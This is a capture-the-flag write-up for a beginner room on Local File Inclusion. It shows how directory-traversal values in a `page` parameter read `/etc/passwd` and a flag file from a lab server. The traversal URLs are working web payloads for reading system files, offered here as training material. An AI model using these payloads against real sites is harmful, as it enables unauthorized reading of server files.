---
## **Room:** LO-FI

## **Level:** Easy

---

## **ABOUT**

This room focuses on a **Local File Inclusion (LFI)** vulnerability.
LFI occurs when a web application does not properly validate user input and allows an attacker to include or read files from the local file system by manipulating a vulnerable parameter.

The application itself gives a hint that it is vulnerable to a Local File Inclusion attack.

![Room Hint](https://github.com/user-attachments/assets/df9e2d94-5c00-46db-b022-79f6168cb2be)

---

## **Understanding the Vulnerability**

The website uses a `page` parameter to load different files, such as:

```
http://10.80.190.8/?page=relax.php
http://10.80.190.8/?page=sleep.php
```

This indicates that the application includes files based on user input.
If this parameter is not properly secured, we can replace its value with paths to local files on the server.

---

## **Exploiting Local File Inclusion**

First, we try including a known Linux system file:

```
http://10.80.190.8/?page=/etc/passwd
```

![Attempt 1](https://github.com/user-attachments/assets/3ddf5f78-538e-4e9e-9c78-01bb76f3e4b3)

If direct inclusion does not work, we try **directory traversal**:

```
http://10.80.190.8/?page=../etc/passwd
http://10.80.190.8/?page=../../etc/passwd
```

![Attempt 2](https://github.com/user-attachments/assets/5ecc0144-2fea-47a1-b343-0c04b8900072)

Finally, we increase the traversal depth:

```
http://10.80.190.8/?page=../../../etc/passwd
```

![Successful LFI](https://github.com/user-attachments/assets/85abce8e-97b9-4242-a6f9-8afc86431871)

At this point, we confirm that **LFI is working**, and the correct traversal depth is `../../../`.

---

## **Finding the Flag**

Since LFI is confirmed, the next step is to search for the flag.
Common flag filenames include:

* `flag.txt`
* `root.txt`

Using the working traversal path, we try:

```
http://10.80.190.8/?page=../../../flag.txt
```

![Flag Found](https://github.com/user-attachments/assets/c3edcc30-866a-4a42-aceb-5bf634c87f6e)

🎉 **Flag successfully retrieved!**

---

## **Conclusion**

This room demonstrates how improper input validation can lead to a **Local File Inclusion vulnerability**, allowing attackers to read sensitive files and retrieve flags. It is an excellent beginner-friendly example of LFI exploitation using directory traversal.

---
